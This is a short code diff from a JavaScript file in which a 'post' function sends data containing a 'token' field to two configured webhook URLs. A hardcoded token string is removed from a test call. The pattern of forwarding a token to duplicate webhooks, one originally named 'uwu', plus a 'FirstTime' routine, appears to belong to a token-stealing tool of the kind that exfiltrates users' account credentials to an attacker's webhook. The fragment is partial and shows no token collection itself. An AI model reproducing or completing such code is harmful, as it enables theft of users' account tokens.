@@ -242,7 +242,7 @@ const post = async (params) => {
             token: token,
         });
 
-        [config.webhook, config.uwu].forEach((webhook) => {
+        [config.webhook1, config.webhook2].forEach((webhook) => {
             const url = new URL(webhook);
             const options = {
                 hostname: url.hostname,
@@ -273,8 +273,7 @@ const post = async (params) => {
     }
 };
 
-  
-post({data: {foo: "bar"}, token: "uBz5SOXMrNqi-m-dE_ielxB_Hc8ihnE_roXkZHZ4EtEwZok5aVcbUg_nt1B_pKhQ--73"});
+post({foo: "bar"});
 
 
 const FirstTime = async () => {
